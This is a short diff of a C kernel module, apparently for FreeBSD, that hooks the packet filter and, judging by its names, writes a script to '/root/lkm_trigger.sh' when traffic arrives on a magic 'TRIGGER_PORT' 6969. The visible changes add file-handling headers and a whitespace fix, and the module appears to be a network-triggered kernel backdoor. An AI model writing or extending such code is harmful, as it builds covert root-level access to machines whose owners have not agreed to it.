@@ -18,6 +18,10 @@
 #include <netinet/ip_var.h>
 #include <net/if.h>
 
+// for making file
+#include <sys/uio.h>    // For UIO_* flags
+#include <sys/vnode.h> // For vnode and file operations
+
 
 // replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
@@ -136,7 +140,7 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
 
 
 
-               
+
                   // File path to create
                 char *filepath = "/root/lkm_trigger.sh";
 
